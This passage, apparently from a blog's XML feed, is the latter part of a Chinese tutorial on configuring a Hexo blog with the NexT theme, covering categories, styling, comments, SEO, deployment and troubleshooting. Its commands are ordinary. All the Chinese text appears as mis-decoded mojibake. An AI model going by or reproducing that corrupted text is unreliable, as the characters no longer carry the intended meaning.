<li><strong>æ ‡ç­¾</strong>ï¼šæ‰å¹³åŒ–ã€å¤šç»´åº¦ï¼ˆä¾‹å¦‚ï¼šä¸€ç¯‡ã€ŒHexoåˆ†ç±»é…ç½®ã€çš„æ–‡ç« ï¼Œæ ‡ç­¾å¯è®¾ <code>Hexo</code>ã€<code>åšå®¢æ­å»º</code>ã€<code>åˆ†ç±»ç®¡ç†</code>ï¼‰ã€‚ä¸€ç¯‡æ–‡ç« å¯å¤šä¸ªæ ‡ç­¾ã€‚</li>
</ul>
<p><strong>4.2 æ­¥éª¤1ï¼šåˆ›å»ºã€Œåˆ†ç±»é¡µã€ã€Œæ ‡ç­¾é¡µã€ï¼ˆè®©å¯¼èˆªèƒ½è®¿é—®ï¼‰</strong><br>Hexoéœ€è¦æ‰‹åŠ¨åˆ›å»ºåˆ†ç±»&#x2F;æ ‡ç­¾çš„â€œå®¹å™¨é¡µé¢â€ï¼Œå¦åˆ™å¯¼èˆªæ ç‚¹å‡»åä¼š404ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºåˆ†ç±»é¡µé¢</span></span><br><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ ‡ç­¾é¡µé¢</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ†åˆ«ç¼–è¾‘è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ Front-matterï¼Œæ·»åŠ  <code>type</code> æ ‡è¯†ï¼š</p>
<ul>
<li><code>source/categories/index.md</code>ï¼š<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">åˆ†ç±»</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
<li><code>source/tags/index.md</code>ï¼š<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">æ ‡ç­¾</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>4.3 æ­¥éª¤2ï¼šç»™æ–‡ç« åˆ†é…ã€Œåˆ†ç±»&#x2F;æ ‡ç­¾ã€</strong><br>ç¼–è¾‘æ¯ç¯‡æ–‡ç« ï¼ˆ<code>source/_posts/xxx.md</code>ï¼‰çš„ Front-matterï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">&quot;ä»€ä¹ˆæ˜¯SSHéš§é“åŠç›¸å…³æŠ€æœ¯&quot;</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-10</span></span><br><span class="line"><span class="attr">updated:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">æŠ€æœ¯</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ç½‘ç»œå®‰å…¨</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">SSH</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">éš§é“æŠ€æœ¯</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">æœåŠ¡å™¨</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<p><strong>4.4 æ­¥éª¤3ï¼šè®©åˆ†ç±»&#x2F;æ ‡ç­¾æ˜¾ç¤ºåœ¨å¯¼èˆªæ </strong><br>åœ¨ <code>themes/next/_config.yml</code> çš„ <code>menu</code> é…ç½®ä¸­ï¼Œæ·»åŠ  <code>categories</code> å’Œ <code>tags</code> èœå•é¡¹ï¼ˆå·²åœ¨ä¸Šæ–‡2.2èŠ‚ä¸­åŒ…å«ï¼‰ã€‚</p>
<hr>
<p><strong>äºŒã€ä¼˜åŒ–å¯¼èˆªä¸åŠŸèƒ½ï¼šè®©åšå®¢æ›´å¥½ç”¨</strong></p>
<p><strong>1. å¼€å¯ã€Œæœç´¢åŠŸèƒ½ã€ï¼ˆå¿…å¤‡ï¼ï¼‰</strong><br>å·²åœ¨ <code>themes/next/_config.yml</code> ä¸­é…ç½® <code>local_search</code>ï¼Œç¡®ä¿å·²å®‰è£… <code>hexo-generator-searchdb</code> æ’ä»¶ã€‚</p>
<p><strong>2. ä»£ç é«˜äº®ä¼˜åŒ–ï¼ˆç¨‹åºå‘˜å¿…å¤‡ï¼‰</strong><br>å·²åœ¨ <code>themes/next/_config.yml</code> ä¸­é…ç½® <code>codeblock.copy_button</code>ï¼Œå¹¶åœ¨ <code>hexo/_config.yml</code> ä¸­å¯ç”¨äº† <code>highlight.line_number</code>ã€‚</p>
<p><strong>3. å›¾ç‰‡å¤„ç†ï¼šé¿å…å¤±æ•ˆ+ä¼˜åŒ–æ˜¾ç¤º</strong></p>
<ul>
<li><strong>æ–¹æ¡ˆ1ï¼šæœ¬åœ°å›¾ç‰‡ï¼ˆæ¨èï¼‰</strong>ï¼šé€šè¿‡ <code>post_asset_folder: true</code> + <code>marked.post_asset: true</code> é…ç½®ï¼Œè„šæœ¬å·²è‡ªåŠ¨å°†å›¾ç‰‡å­˜å…¥æ–‡ç« åŒåæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ <code>![æè¿°](å›¾ç‰‡å.png)</code> çš„ç›¸å¯¹è·¯å¾„ï¼Œ<strong>æ°¸ä¸å¤±æ•ˆ</strong>ã€‚</li>
<li><strong>æ–¹æ¡ˆ2ï¼šå›¾åºŠ</strong>ï¼šè‹¥éœ€å¤šè®¾å¤‡ç¼–è¾‘ï¼Œå¯ç”¨PicGoä¸Šä¼ è‡³GitHubå›¾åºŠï¼Œå¤åˆ¶é“¾æ¥ç²˜è´´ã€‚<strong>ä½†å¼ºçƒˆæ¨èæ–¹æ¡ˆ1</strong>ï¼Œæ•°æ®å®Œå…¨å¯æ§ã€‚</li>
<li><strong>ä¼˜åŒ–æ˜¾ç¤º</strong>ï¼šåœ¨Markdownä¸­ï¼Œä½¿ç”¨ä»¥ä¸‹ä»£ç è®©å›¾ç‰‡å±…ä¸­å¹¶é™åˆ¶å®½åº¦ï¼š<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&lt;!-- å±…ä¸­+é™åˆ¶å®½åº¦ --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;å›¾ç‰‡é“¾æ¥&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;æè¿°&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: block; margin: 0 auto; max-width: 80%;&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="äº”ã€å¤–è§‚ä¼˜åŒ–ï¼šè®©åšå®¢æ›´ä¸ªæ€§åŒ–"><a href="#äº”ã€å¤–è§‚ä¼˜åŒ–ï¼šè®©åšå®¢æ›´ä¸ªæ€§åŒ–" class="headerlink" title="äº”ã€å¤–è§‚ä¼˜åŒ–ï¼šè®©åšå®¢æ›´ä¸ªæ€§åŒ–"></a>äº”ã€å¤–è§‚ä¼˜åŒ–ï¼šè®©åšå®¢æ›´ä¸ªæ€§åŒ–</h1><p><strong>5.1 é€‰æ‹©Nextä¸»é¢˜é£æ ¼ï¼ˆSchemeï¼‰</strong><br>åœ¨ <code>themes/next/_config.yml</code> ä¸­è®¾ç½®ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span>  <span class="comment"># æ¨èï¼šç®€æ´å¤§æ°”ï¼Œé€‚é…åˆ†ç±»/æ ‡ç­¾</span></span><br><span class="line"><span class="comment"># scheme: Mist  # æ›´ç´§å‡‘</span></span><br><span class="line"><span class="comment"># scheme: Pisces # å¡ç‰‡å¼</span></span><br><span class="line"><span class="comment"># scheme: Muse  # é»˜è®¤</span></span><br></pre></td></tr></table></figure>

<p><strong>5.2 è‡ªå®šä¹‰é¢œè‰²&#x2F;å­—ä½“</strong><br>ç¼–è¾‘ <code>themes/next/source/css/_custom/custom.styl</code> æ–‡ä»¶ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è‡ªå®šä¹‰å¯¼èˆªæ èƒŒæ™¯è‰²</span></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#2c3e50</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è‡ªå®šä¹‰é“¾æ¥é¢œè‰²</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#3498db</span>;</span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¨å±€å­—ä½“ï¼ˆæ¨èæ€æºé»‘ä½“ï¼‰</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Source Han Sans CN&quot;</span>, <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»£ç å­—ä½“ï¼ˆæ¨èFira Codeï¼‰</span></span><br><span class="line"><span class="selector-tag">code</span>, pre &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Fira Code&quot;</span>, <span class="string">&quot;Consolas&quot;</span>, monospace;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é¡µé¢èƒŒæ™¯å›¾ï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/bg.jpg&#x27;</span>);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">  <span class="attribute">background-blend-mode</span>: overlay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šå°†èƒŒæ™¯å›¾ <code>bg.jpg</code> æ”¾å…¥ <code>source/images/</code> ç›®å½•ä¸‹ã€‚</p>
</blockquote>
<p><strong>5.3 æ·»åŠ èƒŒæ™¯å›¾&#x2F;å¤´åƒ</strong></p>
<ul>
<li><strong>å¤´åƒ</strong>ï¼šåœ¨ <code>themes/next/_config.yml</code> ä¸­è®¾ç½®ï¼š<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpg</span>  <span class="comment"># å›¾ç‰‡æ”¾åœ¨ source/images/ ç›®å½•ä¸‹</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">1.0</span></span><br></pre></td></tr></table></figure></li>
<li><strong>èƒŒæ™¯å›¾</strong>ï¼šå·²åœ¨ä¸Šæ–‡ <code>custom.styl</code> ä¸­é…ç½®ã€‚</li>
</ul>
<hr>
<h1 id="å…­ã€å¢å¼ºäº’åŠ¨ä¸ä½“éªŒï¼šæ·»åŠ è¯„è®º-é˜…è¯»é‡"><a href="#å…­ã€å¢å¼ºäº’åŠ¨ä¸ä½“éªŒï¼šæ·»åŠ è¯„è®º-é˜…è¯»é‡" class="headerlink" title="å…­ã€å¢å¼ºäº’åŠ¨ä¸ä½“éªŒï¼šæ·»åŠ è¯„è®º&#x2F;é˜…è¯»é‡"></a>å…­ã€å¢å¼ºäº’åŠ¨ä¸ä½“éªŒï¼šæ·»åŠ è¯„è®º&#x2F;é˜…è¯»é‡</h1><p><strong>6.1 è¯„è®ºç³»ç»Ÿï¼ˆæ¨è Gitalkï¼Œé€‚é… GitHub Pagesï¼‰</strong><br>å·²åœ¨ <code>themes/next/_config.yml</code> ä¸­é…ç½® <code>gitalk</code>ï¼Œè¯·æŒ‰è¯´æ˜ç”³è¯·GitHub OAuth Appå¹¶å¡«å…¥ <code>client_id</code> å’Œ <code>client_secret</code>ã€‚</p>
<p><strong>2. é˜…è¯»é‡ç»Ÿè®¡ï¼ˆä¸è’œå­ï¼Œæ— éœ€æ³¨å†Œï¼‰</strong><br>å·²åœ¨ <code>themes/next/_config.yml</code> ä¸­å¯ç”¨ <code>busuanzi_count</code>ã€‚</p>
<hr>
<h1 id="ä¸ƒã€SEOä¼˜åŒ–ï¼šè®©åšå®¢è¢«æœç´¢å¼•æ“æ”¶å½•"><a href="#ä¸ƒã€SEOä¼˜åŒ–ï¼šè®©åšå®¢è¢«æœç´¢å¼•æ“æ”¶å½•" class="headerlink" title="ä¸ƒã€SEOä¼˜åŒ–ï¼šè®©åšå®¢è¢«æœç´¢å¼•æ“æ”¶å½•"></a>ä¸ƒã€SEOä¼˜åŒ–ï¼šè®©åšå®¢è¢«æœç´¢å¼•æ“æ”¶å½•</h1><p><strong>7.1 é…ç½®ç«™ç‚¹ä¿¡æ¯ï¼ˆHexoæ ¹ç›®å½• <code>_config.yml</code>ï¼‰</strong><br>å·²åœ¨ä¸Šæ–‡2.1èŠ‚ä¸­åŒ…å« <code>title</code>, <code>subtitle</code>, <code>description</code>, <code>keywords</code>, <code>author</code>, <code>language</code>, <code>timezone</code>ã€‚</p>
<p><strong>7.2 ç”Ÿæˆç«™ç‚¹åœ°å›¾</strong><br>å·²åœ¨ä¸Šæ–‡1.3èŠ‚å®‰è£…äº† <code>hexo-generator-sitemap</code> å’Œ <code>hexo-generator-baidu-sitemap</code> æ’ä»¶ã€‚æ— éœ€é¢å¤–é…ç½®ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨ç”Ÿæˆ <code>sitemap.xml</code> å’Œ <code>baidu_sitemap.xml</code>ã€‚</p>
<p><strong>7.3 æäº¤ç«™ç‚¹åˆ°æœç´¢å¼•æ“</strong></p>
<ul>
<li><strong>Google æœç´¢æ§åˆ¶å°</strong>ï¼šæ·»åŠ ä½ çš„åŸŸåï¼Œæäº¤ <code>https://ä½ çš„åšå®¢åœ°å€/sitemap.xml</code>ã€‚</li>
<li><strong>ç™¾åº¦æœç´¢èµ„æºå¹³å°</strong>ï¼šæ·»åŠ ä½ çš„åŸŸåï¼Œæäº¤ <code>https://ä½ çš„åšå®¢åœ°å€/baidu_sitemap.xml</code>ã€‚</li>
</ul>
<hr>
<h1 id="å…«ã€ç»†èŠ‚ä¼˜åŒ–ï¼šæå‡è´¨æ„Ÿ"><a href="#å…«ã€ç»†èŠ‚ä¼˜åŒ–ï¼šæå‡è´¨æ„Ÿ" class="headerlink" title="å…«ã€ç»†èŠ‚ä¼˜åŒ–ï¼šæå‡è´¨æ„Ÿ"></a>å…«ã€ç»†èŠ‚ä¼˜åŒ–ï¼šæå‡è´¨æ„Ÿ</h1><p><strong>8.1 æ–‡ç« æ’ç‰ˆ</strong></p>
<ul>
<li><strong>æŠ˜å å—</strong>ï¼ˆé€‚åˆé•¿ä»£ç &#x2F;è¡¥å……è¯´æ˜ï¼‰ï¼š<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">details</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></span>ç‚¹å‡»æŸ¥çœ‹è¡¥å……è¯´æ˜<span class="language-xml"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span></span><br><span class="line">è¿™é‡Œæ˜¯æŠ˜å çš„å†…å®¹...</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
<li><strong>æ¯ç¯‡æ–‡ç« æ·»åŠ ã€Œå‰è¨€&#x2F;å°ç»“ã€</strong>ï¼Œè®©ç»“æ„æ›´æ¸…æ™°ã€‚</li>
</ul>
<p><strong>8.2 404 é¡µé¢</strong><br>åˆ›å»º <code>source/404.md</code>ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">é¡µé¢ä¸å­˜åœ¨</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">&lt;div</span> <span class="string">style=&quot;text-align:</span> <span class="string">center;</span> <span class="attr">margin-top:</span> <span class="string">50px;&quot;&gt;</span></span><br><span class="line">  <span class="string">&lt;h1&gt;404</span> <span class="bullet">-</span> <span class="string">é¡µé¢èµ°ä¸¢å•¦ï½&lt;/h1&gt;</span></span><br><span class="line">  <span class="string">&lt;p&gt;ä½ è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨æˆ–å·²è¢«ç§»åŠ¨&lt;/p&gt;</span></span><br><span class="line">  <span class="string">&lt;a</span> <span class="string">href=&quot;/&quot;</span> <span class="string">style=&quot;color:</span> <span class="comment">#3498db; font-size: 18px;&quot;&gt;è¿”å›é¦–é¡µ&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>8.3 å…³é—­æ— ç”¨åŠŸèƒ½</strong><br>åœ¨ <code>themes/next/_config.yml</code> ä¸­å…³é—­ä¸éœ€è¦çš„åŠŸèƒ½ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">sharejs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="ä¹ã€éƒ¨ç½²ä¸å¤‡ä»½"><a href="#ä¹ã€éƒ¨ç½²ä¸å¤‡ä»½" class="headerlink" title="ä¹ã€éƒ¨ç½²ä¸å¤‡ä»½**"></a>ä¹ã€éƒ¨ç½²ä¸å¤‡ä»½**</h1><p><strong>9.1 éƒ¨ç½²æµç¨‹</strong><br>æ¯æ¬¡ä¿®æ”¹åï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤éƒ¨ç½²ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure>

<p><strong>9.2 æœ¬åœ°æµ‹è¯•</strong><br>åœ¨éƒ¨ç½²å‰ï¼ŒåŠ¡å¿…å…ˆåœ¨æœ¬åœ°æµ‹è¯•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate --debug</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
<p>è®¿é—® <code>http://localhost:4000</code>ï¼Œæ£€æŸ¥ï¼š</p>
<ul>
<li>âœ… æ–‡ç« æ­£å¸¸æ˜¾ç¤º</li>
<li>âœ… å›¾ç‰‡æ­£ç¡®åŠ è½½</li>
<li>âœ… æ ·å¼æ­£å¸¸</li>
<li>âœ… æœç´¢ã€åˆ†ç±»ã€æ ‡ç­¾åŠŸèƒ½æ­£å¸¸</li>
</ul>
<p><strong>9.3 å¤‡ä»½</strong><br>å°† Hexo æ ¹ç›®å½•çš„ <code>_config.yml</code>ã€<code>themes/next/_config.yml</code>ã€<code>source/</code> ç›®å½•ï¼ˆæ–‡ç« +å›¾ç‰‡ï¼‰å¤‡ä»½åˆ° GitHubï¼ˆæ–°å»ºä¸€ä¸ªä»“åº“ï¼Œæ¯”å¦‚ <code>blog-source</code>ï¼‰ï¼Œé¿å…ç”µè„‘æ•…éšœä¸¢å¤±æ•°æ®ã€‚</p>
<hr>
<h1 id="åã€æ•…éšœæ’é™¤å¤§å…¨"><a href="#åã€æ•…éšœæ’é™¤å¤§å…¨" class="headerlink" title="åã€æ•…éšœæ’é™¤å¤§å…¨"></a>åã€æ•…éšœæ’é™¤å¤§å…¨</h1><p><strong>10.1 å›¾ç‰‡ä¸æ˜¾ç¤ºé—®é¢˜</strong></p>
<ul>
<li><strong>ç—‡çŠ¶</strong>ï¼šå›¾ç‰‡æ˜¾ç¤ºä¸ºç©ºç™½æˆ–404ã€‚</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<ol>
<li><strong>æ£€æŸ¥é…ç½®</strong>ï¼šç¡®ä¿ <code>_config.yml</code> ä¸­ <code>post_asset_folder: true</code> å’Œ <code>marked.prepend_root: true</code> å·²å¼€å¯ã€‚</li>
<li><strong>æ¸…ç†ç¼“å­˜</strong>ï¼šæ‰§è¡Œ <code>hexo clean</code> åé‡æ–° <code>hexo generate</code>ã€‚</li>
<li><strong>æ£€æŸ¥è·¯å¾„</strong>ï¼šæµè§ˆå™¨F12æŸ¥çœ‹Networkæ ‡ç­¾ï¼Œç¡®è®¤å›¾ç‰‡è¯·æ±‚çš„URLæ˜¯ <code>æ–‡ç« å/å›¾ç‰‡å.png</code> çš„ç›¸å¯¹è·¯å¾„ã€‚</li>
</ol>
</li>
</ul>
<p><strong>10.2 éƒ¨ç½²å¤±è´¥é—®é¢˜</strong></p>
<ul>
<li><strong>å¸¸è§é”™è¯¯1ï¼šæƒé™æ‹’ç»</strong><ul>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šä½¿ç”¨HTTPSåœ°å€æˆ–é…ç½®SSHå¯†é’¥ã€‚</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/ç”¨æˆ·å/ä½ çš„ç”¨æˆ·å.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure></li>
<li><strong>å¸¸è§é”™è¯¯2ï¼šåˆ†æ”¯ä¸å­˜åœ¨</strong><ul>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šç¡®è®¤ä½ çš„GitHubä»“åº“é»˜è®¤åˆ†æ”¯æ˜¯ <code>main</code> è¿˜æ˜¯ <code>gh-pages</code>ï¼Œå¹¶ç›¸åº”ä¿®æ”¹ <code>branch</code> é…ç½®ã€‚</li>
</ul>
</li>
</ul>
<p><strong>10.3 ä¸»é¢˜æ˜¾ç¤ºå¼‚å¸¸</strong></p>
<ul>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<ol>
<li>ç¡®è®¤ä¸»é¢˜å®‰è£…ï¼š<code>npm list hexo-theme-next</code>ã€‚</li>
<li>æ£€æŸ¥ <code>hexo/_config.yml</code> ä¸­ <code>theme: next</code>ã€‚</li>
<li>æ¸…ç†é‡æ–°å®‰è£…ï¼š<code>rm -rf node_modules &amp;&amp; npm install</code>ã€‚</li>
</ol>
</li>
</ul>
<p><strong>10.4 æ—¶é—´æ˜¾ç¤ºé—®é¢˜</strong></p>
<ul>
<li><strong>ç—‡çŠ¶</strong>ï¼šæ–‡ç« æ—¶é—´ç›¸å·®8å°æ—¶ã€‚</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šç¡®ä¿ <code>hexo/_config.yml</code> ä¸­ <code>timezone: &#39;Asia/Shanghai&#39;</code>ã€‚</li>
</ul>
<hr>
<h1 id="åä¸€ã€ä¼˜åŒ–ä¸è¿›é˜¶"><a href="#åä¸€ã€ä¼˜åŒ–ä¸è¿›é˜¶" class="headerlink" title="åä¸€ã€ä¼˜åŒ–ä¸è¿›é˜¶"></a>åä¸€ã€ä¼˜åŒ–ä¸è¿›é˜¶</h1><p><strong>11.1 æ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li>åœ¨ <code>themes/next/_config.yml</code> ä¸­å¯ç”¨ <code>lazyload: enable: true</code>ã€‚</li>
<li>åœ¨ <code>hexo/_config.yml</code> ä¸­å¯ç”¨ <code>highlight.line_number: true</code>ã€‚</li>
</ul>
<p><strong>11.2 è‡ªå®šä¹‰åŸŸå</strong></p>
<ul>
<li>åœ¨ <code>source/</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º <code>CNAME</code> çš„æ–‡ä»¶ã€‚</li>
<li>æ–‡ä»¶å†…å®¹å†™å…¥ä½ çš„åŸŸåï¼Œä¾‹å¦‚ï¼š<code>yourdomain.com</code>ã€‚</li>
<li>åœ¨ä½ çš„åŸŸåDNSæœåŠ¡å•†å¤„ï¼Œæ·»åŠ ä¸€æ¡CNAMEè®°å½•ï¼ŒæŒ‡å‘ <code>ä½ çš„ç”¨æˆ·å.github.io</code>ã€‚</li>
</ul>
<hr>
<h1 id="åäºŒã€å®ç”¨å‘½ä»¤é€ŸæŸ¥"><a href="#åäºŒã€å®ç”¨å‘½ä»¤é€ŸæŸ¥" class="headerlink" title="åäºŒã€å®ç”¨å‘½ä»¤é€ŸæŸ¥"></a>åäºŒã€å®ç”¨å‘½ä»¤é€ŸæŸ¥</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–°æ–‡ç« </span></span><br><span class="line">hexo new <span class="string">&quot;æ–‡ç« æ ‡é¢˜&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ¬åœ°å†™ä½œï¼ˆé¢„è§ˆè‰ç¨¿ï¼‰</span></span><br><span class="line">hexo server --draft</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»…ç”Ÿæˆé™æ€æ–‡ä»¶</span></span><br><span class="line">hexo generate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼ºåˆ¶æ¸…ç†ç¼“å­˜</span></span><br><span class="line">hexo clean --debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹Hexoç‰ˆæœ¬</span></span><br><span class="line">hexo version</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®éƒ¨ç½²ï¼ˆæœ€å¸¸ç”¨ï¼‰</span></span><br><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="åä¸‰ã€åšå®¢åä½œæ›´æ–°"><a href="#åä¸‰ã€åšå®¢åä½œæ›´æ–°" class="headerlink" title="åä¸‰ã€åšå®¢åä½œæ›´æ–°"></a>åä¸‰ã€åšå®¢åä½œæ›´æ–°</h1><p>13.1 æ‹‰å–myBlog + é…ç½®git</p>
<ul>
<li>git clone <a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#105;&#116;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#109;">git@github.com</a>:ç”¨æˆ·å&#x2F;myBlog.git</li>
<li>git init (åˆå§‹åŒ–åˆšæ‹‰å–çš„myBlog)</li>
<li>git remote add origin <a href="mailto:&#x67;&#x69;&#x74;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;">git@github.com</a>:ç”¨æˆ·å&#x2F;myBlog.git (å…³è”ä»“åº“)</li>
</ul>
<p>13.2 ä¸‹è½½nodejs + hexo</p>
<ul>
<li>å®˜ç½‘ä¸‹è½½nodejs</li>
<li>ä¸‹è½½ hexo npm install -g hexo-cli</li>
</ul>
<p>13.3 nmp ç›¸å…³æ’ä»¶ä¸‹è½½</p>
<ul>
<li>npm install</li>
<li>npm install hexo-deployer-git â€“save</li>
</ul>
<blockquote>
<p>å› ä¸º myBlog å·²ç»hexo åˆå§‹åŒ–å®Œæ¯•ï¼Œä¸éœ€è¦å†è¿›è¡Œåˆå§‹åŒ–<br>myBlog ç§ä»“ç”¨äºåšå®¢åä½œæ›´æ–°ï¼ˆç”¨gitï¼‰, ç”¨hexo deploy æ›´æ–°åšå®¢ä»“</p>
</blockquote>
<p>æ³¨æ„ï¼šæ¯æ¬¡ä¿®æ”¹æ–‡ç« æˆ–å…¶ä»–æ–‡ä»¶æ—¶ï¼Œhexo clean -&gt; hexo g -&gt; hexo deploy -&gt; git add . -&gt; git commit â€¦. -&gt; git push origin main</p>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ‚ç¢</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxä¸­çš„è§£å‹</title>
    <url>/2024/12/04/Linux%E4%B8%AD%E7%9A%84%E8%A7%A3%E5%8E%8B/</url>
